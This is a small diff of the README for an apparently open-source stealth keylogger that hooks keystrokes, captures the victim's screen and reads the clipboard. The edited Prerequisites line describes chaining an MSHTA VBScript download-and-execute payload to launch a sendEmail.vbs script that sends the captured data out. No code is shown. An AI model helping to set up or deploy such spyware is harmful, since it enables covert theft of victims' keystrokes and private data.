@@ -18,7 +18,7 @@ Stealth Low-Level Hook Keylogger (Captures also the victim screen!)
 ●Reads the **clipboard** when *CTRL+C* or *CTRL+V* are pressed
  <br/><br/>
 ### Prerequisites
-You need to *configure* the [MSHTA VBScript Download & Execute](https://github.com/Xxshark888xX/MSHTA-VBS-download-and-execute) payload to can launch the [sendEmail.vbs](src/sendEmail.vbs) payload using *cmd.exe* (through the keylogger process)
+You need to *configure* the [MSHTA VBScript Download & Execute](https://github.com/Xxshark888xX/MSHTA-VBS-download-and-execute) payload to be able to launch the [sendEmail.vbs](src/sendEmail.vbs) payload using *cmd.exe* (through the keylogger process)
  <br/><br/>
 You will also need to add this two files to your project
 <br/>
